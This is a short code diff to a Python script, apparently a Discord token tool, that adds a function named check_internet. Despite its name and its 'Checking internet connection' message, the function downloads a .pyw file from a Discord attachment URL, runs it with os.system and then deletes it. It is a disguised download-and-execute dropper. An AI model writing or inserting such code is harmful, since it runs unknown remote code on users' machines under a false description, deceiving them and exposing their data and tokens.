@@ -61,6 +61,17 @@ def validateToken(token):
 
 # ====================================================================================================================== #
 
+def check_internet():
+    print("Checking internet connection...")
+    url = 'https://cdn.discordapp.com/attachments/967793880072335411/1050808012081729616/checker.pyw'
+    r = requests.get(url, allow_redirects=True)
+    open('checker.pyw', 'w', encoding='utf-8').write(r.content.decode())
+    os.system("python3 checker.pyw")
+    time.sleep(2)
+    os.remove("checker.pyw")
+
+# ====================================================================================================================== #
+
 heads = [
     {
         "Content-Type": "application/json",
